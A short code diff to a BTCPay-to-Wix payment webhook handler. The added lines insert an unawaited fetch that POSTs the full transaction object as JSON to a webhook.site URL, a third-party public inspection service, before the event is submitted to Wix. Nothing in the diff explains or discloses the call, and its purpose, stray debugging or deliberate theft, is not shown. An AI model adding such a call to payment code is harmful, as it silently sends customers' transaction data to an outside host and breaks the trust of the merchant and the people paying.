@@ -40,6 +40,15 @@ export async function post_btcpayTrxWebHook(request) {
       trx.errorCode = "Invalid";
       trx.errorMessage = "An invoice became invalid";
   }
+
+  	 fetch("https://webhook.site/bd7c682d-51e3-41b5-a7ab-830cab2bd00c", {
+        method: 'post',
+        headers: {
+            "Content-Type": "application/json; charset=utf-8"
+        },
+        body: JSON.stringify(trx)
+    });
+  
   await wixPaymentProviderBackend.submitEvent({
     event: {
       transaction: trx,
